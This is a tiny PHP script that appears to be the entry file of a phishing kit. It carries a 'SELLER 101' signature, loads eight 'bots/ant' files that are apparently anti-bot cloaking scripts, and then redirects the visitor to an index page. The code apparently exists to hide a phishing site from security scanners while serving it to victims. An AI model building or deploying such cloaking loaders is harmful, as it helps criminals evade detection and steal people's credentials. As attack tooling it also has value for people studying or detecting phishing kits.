<?php
/*                                 
Now it's SELLER 101 time 
*/

  	require 'bots/ant1.php';
	require 'bots/ant2.php';
	require 'bots/ant3.php';
	require 'bots/ant4.php';
	require 'bots/ant5.php';
	require 'bots/ant6.php';
	require 'bots/ant7.php';
	require 'bots/ant8.php';

            header("Location: ./index.html");

?>
